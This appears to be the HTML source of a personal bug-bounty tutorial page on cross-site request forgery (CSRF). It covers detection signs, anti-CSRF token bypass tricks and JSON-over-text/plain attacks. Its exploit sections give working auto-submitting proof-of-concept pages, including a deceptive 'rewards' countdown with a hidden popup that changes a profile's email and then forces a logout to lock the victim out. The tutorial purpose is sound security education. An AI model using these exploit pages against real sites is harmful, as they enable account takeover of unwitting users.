@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<!-- upto 2 directory depth-->
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Research</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="crossorigin"/>
+    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" media="print" onload="this.media='all'"/>
+    <noscript>
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap"/>
+    </noscript>
+    <link href="../css/font-awesome/css/all.min.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/bootstrap-icons/bootstrap-icons.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/bootstrap.min.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/aos.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/main.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/code-con.css" rel="stylesheet">
+    <noscript>
+      <style type="text/css">
+        [data-aos] {
+            opacity: 1 !important;
+            transform: translate(0) scale(1) !important;
+        }
+      </style>
+    </noscript>
+    
+  </head>
+  <body id="top">
+    <header class="bg-light">
+      <nav class="navbar navbar-expand-lg navbar-light bg-light" id="header-nav" role="navigation">
+        <div class="container"><a class="link-dark navbar-brand site-title mb-0" href="#">Blog 1</a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
+          <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav ms-auto me-2">
+              <li class="nav-item"><a class="nav-link" href="../#about">About</a></li>
+                        <li class="nav-item"><a class="nav-link" href="../bugbounty.html#">Bug Hunting</a></li>
+                        <li class="nav-item"><a class="nav-link" href="../blogs.html">Blogs</a></li>
+                      
+            </ul>
+          </div>
+        </div>
+      </nav>
+    </header>
+    <div class="page-content">
+      <div id="content">
+<header>
+
+</header>
+
+
+
+
+
+
+<div class="section px-3 px-lg-4 pt-5" id="webbug">
+  <div class="container-narrow">
+    <div class="text-center mb-5">
+      <h2 class="marker marker-center">All about CSRF</h2>
+    </div>
+    <div class="row">
+      <div >
+        <div class="card mb-3" data-aos="fade-right" data-aos-delay="100">
+          <div class="card-header px-3 py-2">
+            <div class="d-flex justify-content-center">
+              <div >
+                <h3 class="h5  mb-1">Cross Site Request Forgery  &nbsp;</h3>
+              </div><img src="../images/services/webpage.svg" width="48" height="45" alt="ui-ux"/>
+            </div>
+          </div>
+          <div class="card-body px-3 py-2">
+            <h2>Content</h2>
+            <ul>
+              <li>Introduction</li>
+              <li>Detection</li>
+              <li>Exploit</li>
+              <li>Advance Exploit Method</li>
+              <li>CSRF on JSON data</li>
+              </ul><br>
+            <h2>Introduction</h2>
+
+            <p>
+              Cross-Site Request Forgery (CSRF) is a type of cyber attack where a malicious website tricks a user's web browser into performing actions on another website where the user is authenticated, without the user's knowledge or consent. This can lead to unauthorized actions being taken on the user's behalf. 
+              </p>
+
+           <p>
+            Lets take an example, Imagine you have an online bank account, and you're already logged in to check your balance. Now, let's say you receive an email with a seemingly harmless link, like "Click here for a funny cat video." If you click that link, it might secretly make a request from your already logged-in session on the bank website, causing you to unintentionally transfer money to someone else.
+            In this case, the link is like a trick that takes advantage of your active session on the bank website, making it do things you didn't intend.  
+          </p>
+           <div class="code-container" id="code1">
+            <div class="code-header">
+                <span>Code 1</span>
+                <button class="copy-button" onclick="copyCode('code1')">Copy</button>
+            </div>
+            <div class="code-content">
+                <pre>
+    <code>
+      #You were logged In at your bank account
+      [Your Browser]
+      +-----------------------------------+
+      |          Logged into Bank         |
+      |                                   |
+      |   Session: 1a2b3c4d5e6f7g8h9i0    |
+      +-----------------------------------+
+
+
+      #You click on the link, from your mail Inbox
+          [Your Browser]
+      +-----------------------+ 
+      |  [Hacker's Site]      |                      [Bank's Server]
+      | +-------------------+ |                     +-------------------+
+      | |                   | |                     |                   |
+      | |  [Trick Link]     | | Transfer Amount Req |  [Bank's Website] |
+      | |  (Hidden Request) | |  ------------------>|  Perform Transfer |
+      | |                   | |   With Session      |      Action       |
+      | +-------------------+ |                     +-------------------+
+      +-----------------------+ 
+      </code></pre>
+            </div>
+        </div>
+        <p>
+          Explanation: The victim user was already logged into the bank website (www.mybank.com). Then, the victim user receives an email containing a link (www.mycat.com). The www.mycat.com website contains a hidden code or form that will be executed automatically when anyone opens the link. So, when the user clicks the link, it sends a request from the victim's browser along with the bank's session ID to the bank server . We will discuss this in more detail in a couple of minutes.
+        </p>
+        <p>
+          So, CSRF is like a trick where a bad website fools your browser into doing something on another website where you're already logged in. It's a way for attackers to make your browser perform actions on a site you trust without your knowledge. Websites use security measures to prevent this kind of trickery and keep your accounts safe.
+        </p>
+        
+        <h2>Detection</h2>
+        <p>In this section, we will understand how to determine if it is worthwhile to start searching for CSRF bugs in a specific application.</p>
+        <ol>
+          <li><b>Cookie Based Authentication</b>
+            <p>Web applications generally have two types of authentication: 
+            <ul>
+              <li>Cookie-based authentication involves storing authentication information in cookies, which are then sent with each request to verify the user's identity. 
+                  <code>Cookie: sessionID: 1a2b3c4d5e6f7g8h9i0 </code>
+              </li><br>
+              <li>Token-based authentication, on the other hand, utilizes tokens (usually in the form of JSON Web Tokens or JWTs) to authenticate and authorize users. 
+                <code>JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJuYW1lIjogIkpvaG4gRG9lIiwgImlhdCI6IDE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code>
+              </li>
+            </ul>
+          </p>
+            <p>If an application is using token-based authentication, it is generally considered less susceptible to CSRF (Cross-Site Request Forgery) vulnerabilities compared to cookie-based authentication. This is because browsers automatically include cookies with every request, making CSRF attacks more feasible when cookies are involved.
+
+              In token-based authentication, the authentication information is often stored in tokens, and these tokens need to be explicitly included in the request headers. Browsers do not automatically attach tokens like they do with cookies, making it more challenging for an attacker to execute a successful CSRF attack. 
+            </p>
+          </li>
+          <li><b>No Custom Header</b>
+          <p>Make ensure that there is no presence of custom header in request. If any custom headers are present, attempt to remove them and try to send the request, If the server accepts the request without the custom header, it indicates that the header is not mandatory for that specific request.Then there you can try to perform CSRF. <br>
+            On the other hand, if the server rejects the request without the custom header, it implies that the header is essential for proper request processing. Then CSRF is not possible, because browser don't submit the  custom headers automatically and it is not possible to set header from client side. </p>
+            <p> Header such as: <code>X-App, X-Workspace, X-Csrftoken, etc.</code></p>
+            <p>But there is an Exception, If the Token is Guessable or If the token verfication can be bypassed. Then we can try to use XMLRequest
+              where we can set the custom header, but it can only work if there is CORS misconfiguration. Otherwise, It will be blocked.
+            </p>
+        </li>
+        <li><b>Http Method</b></li>
+        <p>If a particular web application uses an HTTP method other than GET and POST, the likelihood of a CSRF bug may be reduced. This is because traditional HTML form-based proof of concept (POC) exploitation, which relies on the submission of forms using GET or POST, becomes less feasible.</p>
+        <p>For instance, submitting forms via PUT or DELETE requires alternative methods, typically involving XMLHttpRequest (XHR) in JavaScript. In such cases, the attacker might construct a request like:</p>
+        <code>xhr.open('PUT', 'https://example.com/protected-resource', true);</code>
+        <p>
+          However, when making requests using XMLHttpRequest, the browser automatically sets the Origin header. Most modern browsers, as a security measure, block requests that violate the same-origin policy. In this context, the same-origin policy restricts web pages from making requests to a different domain than the one that served the web page.
+        </p><p>While it's true that this adds a layer of protection, successful exploitation might still occur if there's a misconfiguration of Cross-Origin Resource Sharing (CORS). If CORS is misconfigured and allows the malicious domain to make requests to the target domain, then CSRF attacks using HTTP methods other than GET and POST could potentially be successful. Therefore, it remains crucial for web developers to implement secure configurations and adhere to best practices to minimize the risk of CSRF vulnerabilities.
+        </p>
+        <li><b>Same Site Attribute</b>
+        <p>
+          The SameSite attribute is a security feature that can be set for browser cookies to control how they are sent with cross-origin requests. This attribute helps mitigate the risk of Cross-Site Request Forgery (CSRF) attacks by restricting the sending of cookies in cross-origin requests.
+        </p>
+      <p>With SameSite=Lax setting, the cookie is not sent in cross-site requests initiated by third-party websites. While it allows cookies to be sent with top-level navigations and same-site POST requests, it restricts their transmission in cross-site requests, providing a measure of protection against CSRF attacks.</p>  
+    <p>When the SameSite attribute is set to "Strict," the cookie is not sent in any cross-site requests, including top-level navigations and same-site POST requests initiated by third-party websites. This stringent setting provides even stronger protection against CSRF attacks.</p>  
+        <p>Example:    A user is logged in on www.trust.com, and the session cookie has SameSite=Lax or SameSite=Strict.
+          The user visits www.evil.com, where an attacker attempts a cross-site request to www.trust.com on behalf of the user.
+          If SameSite is set to Lax, the browser will prevent the session cookie from being included in the cross-site request, thwarting the CSRF attempt.
+          If SameSite is set to Strict, the cookie will not be transmitted in any cross-site request, providing robust protection against CSRF attacks.</p>
+  </li>
+        <li><b>CAPTCHA</b>
+        <p>When a user attempts to perform a sensitive action, such as changing account settings or making a transaction, the inclusion of a CAPTCHA challenge requires the user to prove their human identity by solving a visually distorted puzzle or entering characters from an image. This introduces a manual step that automated scripts find challenging to overcome.
+
+          By implementing CAPTCHA, web applications ensure that requests carrying out critical actions originate from human users actively interacting with the application. This makes it significantly harder for attackers to automate CSRF attacks, as they would need to bypass the CAPTCHA challenge, which is a complex and resource-intensive task.</p>
+        </li>
+        <li><b>Re-Authentication</b>
+        <p>When users attempt sensitive operations such as changing account settings or conducting financial transactions, the application prompts them to confirm their identity by entering their password or employing another authentication method. This process, known as reauthentication, serves as an additional layer of security, ensuring that the person initiating the action is the legitimate account holder. In the scenario of a CSRF attack, where malicious requests may be made on behalf of an authenticated user, reauthentication becomes a crucial defense mechanism. By requiring users to verify their identity before executing critical actions, reauthentication mitigates the risk of unauthorized or unintended changes, significantly bolstering the overall security posture of web applications.
+        </p>
+        </li>
+        <li><b>Anti-Csrf Token</b>
+        <p>Anti-CSRF tokens can be implemented in various ways</p>
+            <ul>
+              <li>
+                <b>Request Parameter:</b> The anti-CSRF token can be included as a parameter in the form submissions or in the URL. For example, it might look like <code>email=myuser@mail.com&csrf_token=abcd1234</code>. You can try following to bypass<br>
+                <ul>
+                  <li>
+                    Inserting Random Data: If the server checks only for the presence of the CSRF token, you should attempt to insert random data with the exact length of a valid token. This is to test if the server relies solely on the token's length rather than its actual value. 
+                  </li>
+                  <li>
+                    Copying Valid Token: If the server verifies the token, you might want to create a CSRF proof-of-concept (PoC) by copying a valid token from another account. Check if the CSRF token is not tied to a specific user or session and can be reused across different accounts.
+                  </li>
+                  <li>
+                    Removing Token Value: Try sending a "null" or "true" value for the CSRF token. This could exploit situations where the server does not properly check the validity of the token or allows empty values.
+                  </li>
+                  <li>
+                    Removing Parameter and Value: Consider removing both the parameter and its value to exploit potential weaknesses in the server's CSRF protection. This might be effective if the server doesn't properly validate the presence of both the parameter and its corresponding value.
+                    
+                  </li>
+                </ul>
+        
+              </li>
+              <br>
+              <li>
+                <b>HTTP Header:</b> The token can be included in an HTTP header, such as the X-CSRF-Token header. This is commonly used in AJAX requests.
+                <p>Placing the token in the HTTP header (commonly in the "X-CSRF" header) prevent CSRF attacks as the browser typically does not include custom headers in cross-origin requests.
+                  To bypass this security measure and perform a Cross-Site Request Forgery (CSRF) attack, you might use XMLHttpRequest. This object allows making HTTP requests from the browser. However, due to the same-origin policy, XMLHttpRequests are restricted when the request is made to a different domain.
+                  If there is a misconfiguration in the CORS policy on the server, it could allow unauthorized domains to make requests with custom headers, including the one containing the token. This misconfiguration could potentially be exploited by an attacker to perform CSRF attacks.
+                </p>
+              </li>
+            </ul>
+          
+        </li>
+
+          
+        </ol>
+        <h2>Exploit</h2>
+        <div class="code-container" id="code2">
+          <div class="code-header">
+              <span>Exploit 1</span>
+              <button class="copy-button" onclick="copyCode('code2')">Copy</button>
+          </div>
+          <div class="code-content">
+              <pre><code>
+    &lt;html&gt;
+    &lt;body&gt;
+      &lt;form action="https://vulnerable-website.com/email/change" method="POST" id="csrfForm"&gt;
+        &lt;input type="hidden" name="email" value="malicious@attacker.com" /&gt;
+      &lt;/form&gt;
+      &lt;script&gt;
+        document.getElementById('csrfForm').submit();
+      &lt;/script&gt;
+    &lt;/body&gt;
+  &lt;/html&gt;</code></pre>
+          </div>
+      </div>
+      <p>
+        In this example, when the form is loaded, the document.getElementById('csrfForm').submit(); JavaScript function is called, which submits the form with the user's email to the server. The email is set to the attacker's email, and the form is automatically submitted when the page is loaded.
+      </p>
+      <h2>Advance Exploit Method</h2>
+      <p>
+        In the above provided exploit method, it may not be effective. For example, when the user clicks the link, the email is updated, and they are then redirected to their profile. In a real-life scenario, if this were to occur, the user would likely realize that something is wrong when they see that their email has been updated. Consequently, the user may attempt to rectify the situation by updating their email again, preventing the attack from being successful.
+      </p>
+      <img src="img/csrfimg.png" width="700" height="330">
+      <p>
+        So, I have created a script. When the user opens the link, the page will prompt the user to click anywhere. Upon the user's click, the script will send a request to update the email and then redirect the user to log out. Consequently, the user will lose access to the account, and they won't be able to reset the password since the email has been changed.
+      </p>
+      <p>Its is a simple HTML & JS script. There will be two file tom.html (Page where user will click) & form1.html(From here the update request will be send)</p>
+      <div class="code-container" id="code2">
+        <div class="code-header">
+            <span>Tom 1</span>
+            <button class="copy-button" onclick="copyCode('code2')">Copy</button>
+        </div>
+        <div class="code-content">
+            <pre>
+<code>
+  &lt;!DOCTYPE html&gt;
+  &lt;html lang="en"&gt;
+  &lt;head&gt;
+      &lt;meta charset="UTF-8"&gt;
+      &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+      &lt;title&gt;Countdown Page&lt;/title&gt;
+      &lt;style&gt;
+          body {
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              height: 100vh;
+              margin: 0;
+              background-color: #f0f0f0;
+          }
+          #countdown {
+              font-size: 36px;
+              font-weight: bold;
+          }
+      &lt;/style&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+  &lt;div id="countdown"&gt;&lt;/div&gt;
+  &lt;form id="hiddenForm" action="https://www.vulnweb.uk/logout" &gt;
+      &lt;input type="hidden" name="action" value="Out" /&gt;
+     
+    &lt;/form&gt;
+  
+  
+  &lt;script&gt;
+      function openAndCloseTab() {
+      let left = (screen.width);
+      let top = (screen.height);
+      var newWindow = window.open('http://localhost/form1.html', '_blank','width=1, height=1 , top='
+                  + top + ', left=' + left);
+      var countdown = 3;
+      var countdownInterval = setInterval(function() {
+          countdown--;
+          if (countdown &lt;= 0) {
+              clearInterval(countdownInterval);
+              newWindow.close();
+             document.getElementById('hiddenForm').submit();
+              
+          }
+      }, 1000);
+  }
+      var countdownTime = 3;
+      function updateCountdown() {
+          document.getElementById('ct').innerText = 'Stay Here For '+countdownTime + ' seconds for rewards';
+      }
+      function startCountdown() {
+          updateCountdown();
+          var countdownInterval = setInterval(function () {
+              countdownTime--;
+              if (countdownTime &lt;= 0) {
+                  clearInterval(countdownInterval);
+                  alert('Time is up!');
+              } else {
+                  updateCountdown();
+              }
+          }, 1000);
+      }
+      document.body.addEventListener('click', function () {
+          
+          openAndCloseTab() ;
+          startCountdown();
+          
+      });
+  &lt;/script&gt;
+  &lt;h1 id="ct"&gt;CLICK HERE&lt;/h1&gt;
+  &lt;/body&gt;
+  &lt;/html&gt;
+  
+</code>
+            </pre>
+        </div>
+    </div>
+
+    <div class="code-container" id="code3">
+      <div class="code-header">
+          <span>Form 1</span>
+          <button class="copy-button" onclick="copyCode('code3')">Copy</button>
+      </div>
+      <div class="code-content">
+          <pre>
+<code>
+  &lt;form action="https://www.vulnweb.uk/members/my?aoaction=edit" method="POST" enctype="multipart/form-data"&gt;
+        &lt;input type="hidden" name="formID" value="aoProfile" /&gt;
+        &lt;input type="hidden" name="Title" value="Mr" /&gt;
+        &lt;input type="hidden" name="FirstName" value="Hacked" /&gt;
+        &lt;input type="hidden" name="LastName" value="Users" /&gt;
+        &lt;input type="hidden" name="Age&#95;2&#95;1&#95;2024" value="" /&gt;
+        &lt;input type="hidden" name="JobTitle" value="Hacked&#32;Job" /&gt;
+        &lt;input type="hidden" name="Company" value="Hacked&#32;Company" /&gt;
+        &lt;input type="hidden" name="Email" value="hacker&#64;ywy&#46;info" /&gt;
+        &lt;input type="hidden" name="TechnologyInterests" value="5G" /&gt;
+      &lt;/form&gt;
+   
+  &lt;script&gt;
+        document.forms[0].submit();
+  &lt;/script&gt;
+</code>
+          </pre>
+      </div>
+  </div><br>
+  <p style="align-items: center; justify-content: center; margin-left: 50px;">
+
+    <img src="img/csrf-src.gif" style="border: 2px solid rgb(118, 115, 115);" alt="Animated GIF"><br>
+  </p>
+
+    <h2><br>CSRF on JSON data</h2>
+    <p>JSON is commonly used for data interchange in modern web applications, especially in AJAX requests and API communications.  If a web application uses JSON to send data to the server, the POST request might look something like this:</p>
+    <div class="code-container" id="json1">
+      <div class="code-header">
+          <span>Json Req</span>
+          <button class="copy-button" onclick="copyCode('json1')">Copy</button>
+      </div>
+      <div class="code-content">
+          <pre>
+<code>
+  POST /update/email HTTP/1.1
+  Host: vulnweb.com
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+  Accept: application/json
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Content-Type: application/json
+  Content-Length: 45
+  Connection: close
+  Cookie: your-session-cookie=abcdef1234567890
+  
+  {"new_email": "malicious@attacker.com"}</code></pre>
+      </div>
+  </div>
+  <p>When we come across JSON requests that could be vulnerable to CSRF, the first thing we look at is how the application reacts when we change the request's MIME type. If the application is secure, it will give an error and warn that the MIME type is not valid. But, if we're lucky, the application might allow requests with a text/plain MIME type or Content Type.</p>
+  
+  <p>In this situation, we can create a form to send a request to the endpoint, but before that, we have to find a way to include an equal sign in the request body. Since JSON usually doesn't mind the number of key/value pairs, we can try adding an extra pair at the end:</p>
+    <p>So, Simply put the content-type: text/plain and put extra pair of key & value and forward the request</p>
+  <div class="code-container" id="json1">
+    <div class="code-header">
+        <span>Json Req</span>
+        <button class="copy-button" onclick="copyCode('json1')">Copy</button>
+    </div>
+    <div class="code-content">
+        <pre>
+<code>
+POST /update/email HTTP/1.1
+Host: vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: text/plain
+Content-Length: 45
+Connection: close
+Cookie: your-session-cookie=abcdef1234567890
+
+{"new_email": "malicious@attacker.com",
+"test":"value"
+} 
+<span style="color: rgb(179, 175, 175);">//The reason I included Extra pair of value is explained below//</span></code></pre>
+    </div>
+</div>
+<p>Assuming the application accepts that request, we can proceed with our attack. Before diving into the attack, let me explain why I included the extra pair.</p>
+<p>If i craft html code something like <br><code>&lt;form action="https://example.com/api/data" method="POST" id="csrfForm" enctype="text/plain">
+ <br> &lt;input type="hidden" name='{"new_email": "my@mail.com"}' value=' '>
+&lt;/form></code><br><br>
+If you intercept the request, You will get extra "=" at end <code>{"new_email": "my@mail.com"}= </code> Thus, it will create issue and we need to handle the extra "=" sign </p>
+<p>To handle this issue, we will pass extra key name and that "=" equal sign will be append in the value of the extra key. That is the reason , In the above we tried to test the application using extra pair of key and value. Whether it accept extra pair or not.
+<br><code>&lt;form action="https://example.com/api/data" method="POST" id="csrfForm" enctype="text/plain">
+  &lt;input type="hidden" name='{"new_email": "my@mail.com","test_value":"' value='"}' >
+&lt;/form></code></p>
+
+Now, If you Intercept the request. You will find that proper json is passed <code>{"new_email": "my@mail.com","test_value":"="}</code> 
+<br><p>Below, the JSON POC is provided. You can modify the poc by yourself </p>
+<div class="code-container" id="json2">
+  <div class="code-header">
+      <span>JSON POC</span>
+      <button class="copy-button" onclick="copyCode('josn2')">Copy</button>
+  </div>
+  <div class="code-content">
+      <pre>
+<code>
+  &lt;!DOCTYPE html&gt;
+  &lt;html&gt;
+  &lt;body&gt;
+  &lt;form action="https://change_here.com/api/data" method="POST" id="csrfForm" enctype="text/plain"&gt;
+    &lt;input type="hidden" name='{"new_email": "my@mail.com", "confirm_email":"my@mail.com" ,"random_name_here":"' value='"}' &gt;
+  &lt;/form&gt;
+  
+  &lt;script&gt;
+  document.getElementById('csrfForm').submit();
+  &lt;/script&gt;
+  &lt;/body&gt;
+  &lt;/html&gt;
+</code>
+      </pre>
+  </div>
+</div>
+</div>
+        </div>
+      </div>
+      
+      
+     
+     
+      
+    </div>
+  </div>
+</div>
+<footer class="pt-4 pb-4 text-center bg-light">
+  <div class="container">
+    <div class="text-small text-secondary">
+      <div class="mb-1">&copy; Feel free to reach out to me at souvik09243@mail.com. I welcome any corrections or additional insights you may have.</div>
+      <div>
+    </div>
+  </div>
+</footer>
+
+</div>
+    </div>
+    <div id="scrolltop"><a class="btn btn-secondary" href="#top"><span class="icon"><i class="fas fa-angle-up fa-x"></i></span></a></div>
+    <script src="../scripts/imagesloaded.pkgd.min.js?ver=1.2.0"></script>
+    <script src="../scripts/masonry.pkgd.min.js?ver=1.2.0"></script>
+    <script src="../scripts/BigPicture.min.js?ver=1.2.0"></script>
+    <script src="../scripts/purecounter.min.js?ver=1.2.0"></script>
+    <script src="../scripts/bootstrap.bundle.min.js?ver=1.2.0"></script>
+    <script src="../scripts/aos.min.js?ver=1.2.0"></script>
+    <script src="../scripts/main.js?ver=1.2.0"></script>
+    <script>
+        function copyCode(codeId) {
+            var codeContainer = document.getElementById(codeId).querySelector('.code-content');
+            var range = document.createRange();
+            range.selectNode(codeContainer);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            window.getSelection().removeAllRanges();
+
+            var copyButton = document.querySelector('.copy-button');
+            copyButton.classList.add('copied');
+
+            setTimeout(function() {
+                copyButton.classList.remove('copied');
+            }, 500);
+        }
+    </script>
+  </body>
+</html>
